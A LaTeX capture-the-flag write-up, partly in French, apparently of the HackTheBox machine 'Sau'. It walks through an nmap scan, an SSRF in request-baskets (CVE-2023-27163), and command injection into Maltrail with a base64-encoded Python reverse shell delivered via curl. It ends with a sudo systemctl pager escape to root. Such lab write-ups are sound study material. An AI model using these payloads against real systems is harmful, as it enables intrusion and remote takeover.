\chapter{Sau}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}

\section{External}
\subsection{nmap}
\begin{verbatim}
$ nmapz 10.10.11.224
TCP ports found: 22,80,8338,55555
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-27 04:38 CEST
Nmap scan report for 10.10.11.224
Host is up (0.031s latency).

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 27 Aug 2023 02:39:26 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sun, 27 Aug 2023 02:38:59 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sun, 27 Aug 2023 02:38:59 GMT
|_    Content-Length: 0

\end{verbatim}

\subsection{55555}
\begin{verbatim}
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://10.10.11.224:55555/FUZZ
...SNIP...
web                     [Status: 200, Size: 8700, Words: 1800, Lines: 230, Duration: 39ms]

\end{verbatim}

Si on trouve la master token on accede à tous les paniers
\begin{verbatim}
2tfsy8d =>
    Authorization: 87taa7-ThaUKRi_DW6vV-gPOHkSKShmTmL8p_ZmBKm6y 
\end{verbatim}

Logique:
\begin{itemize}
    \item \verb+PUT api/baskets/<name>+: permet de faire une redirection. SSRF ?
    \item \verb+PUT api/baskets/<name>/responses/<METHOD>+: on peut définir la reponse que va faire le système
    \item \verb+GET /api/baskets?skip=<basketsCount>+ 
    \item \verb+GET /api/stats+ 
    \item \verb+GET /api/baskets/<NAME>/+ 
\end{itemize}

\subsubsection{SSRF}

\begin{verbatim}
PUT /api/baskets/z8gw687 HTTP/1.1
...SNIP...
{"forward_url":"http://10.10.16.3:4444","proxy_response":false,"insecure_tls":false,"expand_path":false,"capacity":200}
\end{verbatim}

\begin{verbatim}
$ nc -lnvp 4444
Connection from 10.10.11.224:37942
GET /?url=http://10.10.11.224:55555/z8gw687 HTTP/1.1
Host: 10.10.16.3:4444
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
X-Do-Not-Forward: 1


\end{verbatim}



\href{https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3}{CVE-2023-27163}

\begin{verbatim}
PUT /api/baskets/6o12ym0 HTTP/1.1
...SNIP...
{"forward_url":"http://127.0.0.1:80/","proxy_response":true,"insecure_tls":false,"expand_path":false,"capacity":200}
\end{verbatim}

\begin{verbatim}
$ curl http://10.10.11.224:55555/6o12ym0
<!DOCTYPE html>
...SNIP...
<div class="bottom noselect">Powered by <b>M</b>altrail (v<b>0.53</b>)</div>

\end{verbatim}

\href{https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/}{Unauthenticated OS Command Injection in stamparm/maltrail }


avec revshell on craft donc un revshell encodé en b64.
\begin{verbatim}
ZXhwb3J0IFJIT1NUPSIxMC4xMC4xNi40IjtleHBvcnQgUlBPUlQ9NDQ0NDtweXRob24zIC1jICdpbXBvcnQgc3lzLHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KChvcy5nZXRlbnYoIlJIT1NUIiksaW50KG9zLmdldGVudigiUlBPUlQiKSkpKTtbb3MuZHVwMihzLmZpbGVubygpLGZkKSBmb3IgZmQgaW4gKDAsMSwyKV07cHR5LnNwYXduKCJzaCIpJw==
\end{verbatim}


on configure le forward :
\begin{verbatim}
{"forward_url":"http://127.0.0.1:8338/login","proxy_response":true,"insecure_tls":false,"expand_path":false,"capacity":200}
\end{verbatim}

et on exeute:
\begin{verbatim}
curl 'http://10.10.11.224:55555/6o12ym0/login' 
    --data 'username=;`echo+"ZXh...SNIP...zaCIpJw=="+|+base64+-d+|+sh`'
\end{verbatim}




\section{Internal}
\subsection{puma}

\begin{verbatim}
$ mkdir /home/puma/.ssh
$ chmod 700 /home/puma/.ssh
$ echo 'sh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE3KhYB8UZ2pttAFvwPHvj7U+cA4uWYoHo9csDR2hYdC jubeaz@jubeaz' > /home/puma/.ssh/authorized_keys
\end{verbatim}

marche pas

\begin{verbatim}
puma@sau:~$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

\end{verbatim}

\begin{verbatim}
puma@sau:/etc/systemd/system$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!sh
!sshh!sh
# whoami
whoami
root

\end{verbatim}



